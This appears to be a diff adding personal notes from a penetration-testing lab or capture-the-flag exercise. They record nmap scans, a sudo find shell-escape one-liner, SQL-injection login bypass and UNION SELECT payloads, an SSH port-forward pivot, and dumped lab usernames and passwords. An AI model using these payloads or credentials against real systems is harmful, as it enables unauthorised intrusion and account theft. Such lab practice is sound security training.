@@ -1,0 +1,67 @@
+t1 ip: 10.50.27.22
+nmap -Pn 10.50.27.22 -p 21-23,80 -T5 
+sudo find . -exec /bin/sh \; -quit
+obvious webpage open -- web exploitation 
+run nmap -Pn -T5 -sT -p 80 --script http-enum.nse <ip>
+  running this nmap will show you files of interest
+  /scripts/ contained ssh creds for "user2"
+sign in page:
+entered "tom' or 1='1" in both username and passwd 
+returned "welcome Aaron"
+identify variables being used as username and passwd in the f5 network tab under post request 
+enter this value into the login.php url: ?username=tom' OR 1='1 & passwd=tom' OR 1='1
+view source code to see credentials 
+Array
+(
+    [0] => user2
+    [name] => user2
+    [1] => RntyrfVfNER78
+    [pass] => RntyrfVfNER78
+)
+1Array
+(
+    [0] => user3
+    [name] => user3
+    [1] => Obo4GURRnccyrf
+    [pass] => Obo4GURRnccyrf
+)
+1Array
+(
+    [0] => Lee_Roth
+    [name] => Lee_Roth
+    [1] => anotherpassword4THEages
+    [pass] => anotherpassword4THEages
+)
+1
+file upload:
+
+contacts page: 
+
+--------------------------------------------------------
+
+ssh into box with creds found in /scripts/
+cat /etc/hosts to find new webserv (priv) 
+tunnel into webserv after proxychains nmap chains 
+  ssh user2@10.50.27.2 -L 11300:192.168.28.181:80
+  firefox 127.0.0.1:11300
+  
+  
+webapage has radio buttons with a selction of catologed items,,,, looks like golden statement + sql injections 
+navigate through selections with golden statement until one reutrns smth useful 
+in this case its #7
+http://127.0.0.1:11300/pick.php?product=7 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
+
+http://127.0.0.1:11300/pick.php?product=7 UNION SELECT user_id,name,username from siteusers.users
+
+**UNION SELECT x,y,z from leftcolumn.rightcolumn**
+
+Item 	On Hand 	              Price
+HAM 	  32 	                  $15
+1 	Aaron 	                  $Aaron
+2 	user2 	                  $user2
+3 	user3 	                  $user3
+4 	Lroth 	                  $Lee_Roth
+1 	ncnffjbeqlCn$$jbeq 	      $Aaron      apasswordyPa$$word
+2 	RntyrfVfNER78 	          $user2      EaglesIsARE78
+3 	Obo4GURRnccyrf 	          $user3      Bob4THEEapples
+4 	anotherpassword4THEages 	$Lroth
